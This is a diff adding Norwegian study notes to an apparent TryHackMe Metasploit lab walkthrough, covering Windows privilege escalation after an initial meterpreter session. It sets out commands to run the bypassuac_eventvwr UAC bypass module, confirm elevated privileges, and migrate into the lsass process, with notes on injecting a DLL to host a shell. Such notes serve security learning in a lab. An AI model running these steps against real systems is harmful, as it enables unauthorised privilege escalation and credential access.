@@ -67,4 +67,47 @@ run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true	#SHOWDESCRITPI
 
 #Men det er viktig aa huske at det kan ogsaa vaere tilfelle at exploiten ikke ble sjekket i det hele tatt. Dette hender nar exploiter som trenger en option/variabel som ikke er satt
 
+Lester gir en boottevis med ulike exploiter som kan fungere, og sammen med SHOWDESCRIPTION kan vi lese ganske detaljert hva hver exploit gjoor.
+I dette eksempelet var foorste exploit veldig passende:
 
+exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                  
+  This module will bypass Windows UAC by hijacking a special key in    
+  the Registry under the current user hive, and inserting a custom   
+  command that will get invoked when the Windows Event Viewer is      
+  launched. It will spawn a second shell that has the UAC flag turned
+  off. This module modifies a registry key, but cleans up the key once                    
+  the payload has been invoked. The module does not require the                                                                                                                     
+  architecture of the payload to match the OS. If specifying      
+  EXE::Custom your DLL should call ExitProcess() after starting your   
+  payload in a separate process.   
+
+Vi setter vaar naavaerende ookt som bruker icecast header exploiten i bakgrunn og bruken den nye exploiten gitt av lester:
+background					#Setter naavaerende prosess i bakgrunn
+use exploit/windows/local/bypassuac_eventvwr	#Bruker ny modul av exploit typen
+show options					#Vise hvilke options/variabler som er nodvendig for aa kjore, hva som er mulig aa gjoore i denne modulen
+#Show options viser noe spessielt her, denne modulen krever at vi har en ookt som saa denne modulen kan brukes paa. vi maa altsa sette variabelen "session"
+set session sessionNummer			#set session 2 i mitt tilfelle
+#TryHackMe pressiserte at naa som vi hadde satt variabelen/option til aa vaere lik noe saa skulle vi se nye options fra "show options". Dette var ikke tilfelle for meg
+#Iallfall sier TryHackMe at vi vaar lytte prosess har feil IP saa vi maa endre paa variabelen "lhost". Jeg saa ingen indikasjon paa at denne variabelen trengte aa endres
+#likevel satte jeg "setg lhost 34.245.220.134"
+
+Naa som vi har satt de noodvendige variablene kan vi kjoore modulen:
+run		#kjoor exploit/modulen
+
+Exploiten fungerte konge og aapnet en ny meterpreter ookt, denne hadde langt flere rettigheter. Rettigheter kan bli sjekket med:
+getprivs		#Ekstremt nyttig, faar en listet visning av rettighetene dine.
+
+Den nye meterpreter session med eskalerte rettigheter lar oss migrere, dette kan vaere lurt aa gjoore til en stabil prosess:
+ps				#process list/processes, da ser vi alle prosessene og deres PID. kan skrive ps lsass for aa filtrere paa denne prosessen spesifikt
+migrate skrivPIDpaaProsessenDuVilMigrereTil
+#I dette tilfellet vil TryHackMe at vi skal migrere til lsass (Local Security Authority Subsystem) som validerer innlogging av en bruker paa en pc eller en server.
+
+ps lsass
+		#Viktig aa notere seg to ting. For aa kunne "interacte" med lsass maa vi "bo i/living in" en process som har samme arkitektur som lsass tjenesten.
+		#I dette tilfellet er det x64, I tillegg maa prosessen du migrerer fra ha samme rettigheter som lsass. 
+	
+		#Andre som er viktig er begrepet "bo i/living in" en prosess. Ofte naar vi tar over et kjoorende program saa laster vi ett nytt library
+		#(ett nytt i tillegg er kanskje mer riktig aa si). Dette library kalles (dll), saa vi laster et nytt dll i det kjorende programmet. Dette library har vaar
+		#malicious kode i seg. Fra dette kan vi "spawn a new thread that host our shell". 
+	
+ 
